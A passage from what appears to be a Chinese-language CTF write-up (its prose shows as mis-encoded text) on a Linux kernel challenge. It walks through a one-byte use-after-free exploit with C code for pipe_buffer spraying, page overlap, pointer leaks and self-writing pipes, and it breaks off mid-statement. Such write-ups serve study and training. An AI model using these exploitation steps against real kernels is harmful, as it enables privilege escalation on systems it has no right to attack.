class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!bufs))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> h = head &amp; mask;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> t = tail &amp; mask;<br><span class="hljs-keyword">if</span> (h &gt; t) &#123;<br><span class="hljs-built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,<br>       n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tsize = pipe-&gt;ring_size - t;<br><span class="hljs-keyword">if</span> (h &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,<br>       h * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,<br>       tsize * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>&#125;<br>&#125;<br><br>head = n;<br>tail = <span class="hljs-number">0</span>;<br><br>kfree(pipe-&gt;bufs);<br>pipe-&gt;bufs = bufs;<br>pipe-&gt;ring_size = nr_slots;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h1><p>æ¼æ´å°±ä¸è¯´äº†(Ë‰â–½Ë‰ï¼›)â€¦ï¼Œ0x200çš„chunkï¼Œæœ‰ä¸€æ¬¡ä¸€å­—èŠ‚çš„uaf</p><h2 id="æ„é€ é¡µçº§uaf"><a href="#æ„é€ é¡µçº§uaf" class="headerlink" title="æ„é€ é¡µçº§uaf"></a>æ„é€ é¡µçº§uaf</h2><p>å¯ä»¥æŠŠpipe_bufferåˆ†é…åˆ°uafçš„chunkï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ›´æ”¹pageæˆå‘˜çš„ä½å­—èŠ‚ï¼Œä¸€ä¸ªpageç»“æ„ä½“æ˜¯0x40ï¼Œåªè¦æŠŠä½å­—èŠ‚æ”¹æˆ0x40çš„å€æ•°å°±å¯èƒ½ä½¿ä¸¤ä¸ªpipe_buffer-&gt;pageæŒ‡å‘åŒä¸€ä¸ªpage</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page1.png" class title="page1"><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page2.png" class title="page2"><p>å†æŠŠè¿™ä¸ªpageé‡Šæ”¾æ‰æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªuafçš„pageï¼Œå†æŠŠè¿™ä¸ªpageåˆ†é…ç»™å…¶ä»–çš„ç»“æ„ä½“å°±å¯ä»¥é€šè¿‡pipeç®¡é“çš„æ€§è´¨æ›´æ”¹ç»“æ„ä½“çš„å†…å®¹</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page3.png" class title="page3"><p>æ¥çœ‹exp</p><ul><li><p>ä¸€äº›å‡†å¤‡å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">save_status();<br>bind_core(<span class="hljs-number">0</span>);<br>fd_water = open(<span class="hljs-string">&quot;/dev/water&quot;</span>, O_RDWR);<br><span class="hljs-keyword">if</span>(fd_water &lt; <span class="hljs-number">0</span>)<br>    err_exit(<span class="hljs-string">&quot;Fail to open the device water!&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>è¿›è¡Œä»¥ä¸Šåˆ©ç”¨éœ€è¦ä¸€äº›pipe_buffer-&gt;pageæ˜¯ç‰©ç†ç›¸é‚»çš„ï¼ŒæŠŠorder 0çš„pageæ¶ˆè€—å…‰å°±èƒ½ä»æ›´é«˜çš„orderå–pageå¹¶è¿›è¡Œåˆ†è£‚ï¼Œè¿™æ ·å°±èƒ½è·å¾—ç›¸é‚»çš„pageäº†ï¼Œæ‰€ä»¥ï¼Œç®€å•ç²—æš´åœ°å¼€å–·ï¼</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/alloc3-0.png" class title="alloc3-0"><ul><li><p>å–·ä¸€äº›pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åˆ†ä¸¤æ³¢æ›´æ”¹å¤§å°ï¼Œåˆ†ä¸¤æ³¢çš„åŸå› </p><ul><li>åç»­writeçš„æ—¶å€™ä¼šç»™buffer_pipe-&gt;pageåˆ†é…ç‰©ç†é¡µï¼Œé¡ºåºå’Œç°åœ¨é‡æ–°åˆ†é…buffer_pipeä¸€æ ·</li><li>å‰é¢åˆ†é…çš„pageå¯èƒ½ä¸æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œè€Œåˆ©ç”¨éœ€è¦è¿ç»­çš„ç‰©ç†é¡µ</li><li>æ‰€ä»¥ç¬¬ä¸€æ³¢åˆ†é…å…ˆæ¶ˆè€—ä¸€ä¸‹ä¸è¿ç»­çš„ç‰©ç†é¡µï¼Œä¹‹åçš„ç‰©ç†é¡µå°±æ˜¯è¿ç»­çš„äº†</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] first extend pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br>&#125;<br>    <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] UAF...&quot;</span>);<br>add_chunk(<span class="hljs-string">&quot;Eurus&quot;</span>);<br>delete_chunk();<br>    <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] second extend pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>writeä¸€æ³¢ï¼Œç»™pipe_buffer-&gt;pageåˆ†é…ç‰©ç†é¡µï¼Œå†™å…¥pipe_fdçš„ç¼–å·ä¾¿äºå¯»æ‰¾æ˜¯å¦æˆåŠŸé€ æˆpageé‡å </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨uafæ›´æ”¹pipe_buffer-&gt;pageçš„ä½å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] edit one...&quot;</span>);<br>edit_chunk(<span class="hljs-string">&quot;\x80&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>æŸ¥æ‰¾æ˜¯å¦é€ æˆpageé‡å å¹¶ç¡®å®švictim pipe_bufferçš„åºå·victim_pidï¼Œå¦‚æœè¯»å‡ºçš„idxå’Œå®é™…çš„idxä¸ä¸€æ ·åˆ™æˆåŠŸ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> nr;<br>    <br>    <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i)<br>    &#123;<br>        orig_pid = nr;<br>        victim_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>               victim_pid, orig_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;Fail to find the orig!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="æ„é€ äºŒçº§è‡ªå†™ç®¡é“"><a href="#æ„é€ äºŒçº§è‡ªå†™ç®¡é“" class="headerlink" title="æ„é€ äºŒçº§è‡ªå†™ç®¡é“"></a>æ„é€ äºŒçº§è‡ªå†™ç®¡é“</h2><p>ä¸Šæ–‡ä¸­æˆ‘ä»¬å·²ç»æœ‰äº†é¡µçº§uafï¼Œç°åœ¨å¯ä»¥ç”¨è¿™ä¸ªé¡µåˆ†é…ç»“æ„ä½“è¿›è¡Œæ³„éœ²å’Œç»“æ„ä½“æ”¹å†™äº†ï¼Œè¿™é‡Œä¾ç„¶é€‰æ‹©pipe_bufferä½œä¸ºvictimç»“æ„ä½“</p><ul><li><p>kmallocåœ¨å¯¹åº”kmem_cacheçš„slabä¸å¤Ÿç”¨æ—¶ä¼šå‘buddy systemç”³è¯·pageåšä¸ºæ–°çš„slabï¼Œç”³è¯·çš„pageçš„orderç”±kmem_cacheç»“æ„ä½“çš„ooæˆå‘˜çš„é«˜16ä½å†³å®š</p></li><li><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ–°çš„pipe_bufferæ•°ç»„çš„å¤§å°æ»¡è¶³<strong>å¯¹åº”kmem_cacheçš„ooé«˜16ä½ä¸º0</strong>ï¼Œè¿™æ ·æ‰ä¼šå°†åˆšæ‰uafçš„pageå–å›æ¥ä½œä¸ºslabåˆ†é…ï¼Œè¿™ä¹Ÿå°±æ˜¯expä¸­snd_pipe_szçš„è®¡ç®—é€»è¾‘ï¼Œè¿™é‡Œé€‰æ‹©96çš„kmem_cache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br></code></pre></td></tr></table></figure></li></ul><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" class title="uaf2"><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¬ä¸€æ¬¡uafè·å–victim pipe_bufferçš„å†…å®¹ï¼Œæ³„éœ²victim pageçš„åœ°å€</p><ul><li><p>ç„¶åå†åœ¨victim pageä¸Šé€ ä¸€ä¸ªuafï¼Œå†æŠŠvictim pageåˆ†é…ä¸ºpipe_bufferæ•°ç»„</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf3.png" class title="uaf3"></li><li><p>ç”±äºæˆ‘ä»¬å·²ç»çŸ¥é“äº†victim pageçš„åœ°å€ï¼Œå¯ä»¥æŠŠvictim pipe_buffer2-&gt;pageå†æŒ‡å›victim pageï¼Œæˆ‘æ”¹æˆ‘è‡ªå·±ï¼ˆ</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf4.png" class title="uaf4"></li></ul><p>è¿™æ—¶å°±å¯ä»¥ä¿®æ”¹pipe_bufferçš„offsetå’Œlenæ¥æ§åˆ¶pipeçš„è¯»å†™èµ·å§‹ä½ç½®ï¼ˆoffsetæ˜¯è¯»èµ·å§‹ä½ç½®ï¼Œlenæ˜¯å†™èµ·å§‹ä½ç½® - è¯»èµ·å§‹ä½ç½®ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç»§ç»­exp</p><p>æˆ‘ä»¬éœ€è¦3ä¸ªè¿™æ ·çš„self-pointing pipe_buffer</p><ul><li><p>å…ˆå‘victim pipeé‡Œå†™ä¸€äº›æ•°æ®ä¸ç„¶ä¹‹åæ— æ³•è¯»å–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure></li><li><p>åˆ¶é€ é¡µçº§uafï¼Œåˆ©ç”¨fcntlå°†pipe_bufferåˆ†é…åˆ°uafé¡µä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ³„éœ²pipe_buffer-&gt;pageå’Œpipe_buffer-&gt;ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>       <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>       info_pipe_buf.page, info_pipe_buf.ops);<br>  <br><span class="hljs-keyword">if</span>((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span> || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>&#125;<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹è¯»å†™æ•°æ®é‡çš„è®¡ç®—ï¼Œå…ˆæ˜¯read</p><ul><li><p>ç”±äºä¹‹å‰å·²ç»è¯»å–äº†8+4å­—èŠ‚ç”¨äºåˆ¤æ–­pageé‡å æ˜¯å¦æˆåŠŸï¼Œæ‰€ä»¥æ­¤æ—¶offsetä¸º12ï¼Œæƒ³è¦è¯»å–åœ¨pipe_bufferç»“æ„ä½“å¼€å§‹çš„æˆå‘˜å°±åªèƒ½è¯»å–ä¸‹ä¸€ä¸ªslab-96çš„pipe_buffer</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read1.png" class title="read1"></li><li><p>æ‰€ä»¥è¦å…ˆè¯»å–96-8-4å­—èŠ‚æ‰èƒ½è¯»åˆ°ç¬¬äºŒä¸ªslab-96çš„pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read2.png" class title="read2"></li></ul><p>å†è§£é‡Šä¸€ä¸‹writeçš„æ•°æ®é‡è®¡ç®—</p><ul><li><p>ç”±äºwriteçš„åç§»ä¸€å®šåœ¨readä¹‹åï¼Œæ‰€ä»¥è¦æƒ³æ›´æ”¹pipe_bufferåªèƒ½æ”¹ç¬¬ä¸‰ä¸ªslab-96çš„piipe_bufferï¼ˆå‰ä¸¤ä¸ªç”¨äºreadäº†ï¼‰</p></li><li><p>ä¹‹å‰å·²ç»å‘pipeä¸­å†™å…¥äº†8 * 5 + 4 * 2å­—èŠ‚ï¼Œæ‰€ä»¥è¦å…ˆwriteè¿™ä¹ˆå¤šğŸ‘‡å­—èŠ‚æ¥ä¿è¯æ­¤æ—¶writeçš„åç§»ä½äºç¬¬ä¸‰ä¸ªslab-96çš„pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write1.png" class title="write1"></li></ul></li><li><p>æ›´æ”¹pipe_buffer-&gt;pageåˆ¶é€ ç¬¬äºŒä¸ªuafï¼Œå¹¶ç¡®å®švictim pipe_bufferçš„åºå·snd_vicitm_pid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*)((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> nr;<br>    <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)<br>    &#123;<br>        snd_orig_pid = nr;<br>        snd_vicitm_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d 